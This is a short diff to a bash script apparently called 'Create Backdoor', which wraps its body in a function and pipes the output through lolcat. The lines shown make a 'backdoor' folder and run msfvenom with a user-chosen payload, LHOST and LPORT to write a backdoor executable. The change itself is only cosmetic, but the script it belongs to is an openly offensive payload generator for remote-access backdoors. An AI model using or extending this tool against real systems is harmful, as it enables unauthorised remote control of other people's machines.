@@ -1,6 +1,7 @@
 #!bin/bash
 mkdir backdoor
 clear
+autobackdoor(){
 echo '                            Create Backdoor '
 sleep 1s
 echo -n '                                 .'
@@ -89,3 +90,5 @@ echo $ext
 echo $host
 echo $port
 msfvenom -p $tcp LHOST=$host LPORT=$port -f $ext -o backdoor/backdoor.$ext1
+}
+autobackdoor | lolcat
